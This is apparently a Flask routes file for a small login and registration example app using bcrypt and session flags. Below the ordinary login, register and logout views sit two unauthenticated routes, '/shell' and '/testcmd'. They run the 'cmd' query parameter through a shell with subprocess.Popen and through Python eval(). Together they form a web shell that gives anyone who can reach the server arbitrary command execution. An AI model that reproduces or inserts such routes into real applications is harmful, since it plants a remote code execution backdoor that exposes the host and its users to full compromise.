"""Flask Login Example and instagram fallowing find"""

import subprocess
from flask import Flask, url_for, render_template, request, redirect, session
# from flask_sqlalchemy import SQLAlchemy
from flask_bcrypt import Bcrypt
from darts.app import app
from darts.models import db, User

bcrypt = Bcrypt(app)

@app.route('/', methods=['GET', 'POST'])
def home():
    """ Session control"""
    if not session.get('logged_in'):
        return render_template('index.html')
    else:
        if request.method == 'POST':
            username = request.form['username']
            return render_template('index.html', data=username)
        return render_template('index.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login Form"""
    if request.method == 'GET':
        return render_template('login.html')
    else:
        name = request.form['username']
        passwd = request.form['password']
        # try:
        data = User.query.filter_by(username=name).first()
        if data is None:
            return 'Dont Login none'
        if bcrypt.check_password_hash(data.password, passwd):
            session['logged_in'] = True
            return redirect(url_for('home'))
        else:
            return 'Dont Login'
        # except:
        #     return "Dont Login except"

@app.route('/register/', methods=['GET', 'POST'])
def register():
    """Register Form"""
    if request.method == 'POST':
        hashed_pass = bcrypt.generate_password_hash(request.form['password']).decode('utf-8')
        new_user = User(username=request.form['username'], password=hashed_pass)
        db.session.add(new_user)
        db.session.commit()
        return render_template('login.html')
    return render_template('register.html')

@app.route("/logout")
def logout():
    """Logout Form"""
    session['logged_in'] = False
    return redirect(url_for('home'))

@app.route("/shell")
def shell():
    cmd = request.args.get('cmd')
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout_data, stderr_data = p.communicate()
    return stdout_data
    # return cmd

@app.route("/testcmd")
def testcmd():
    cmd = request.args.get('cmd')
    return eval(cmd)
    
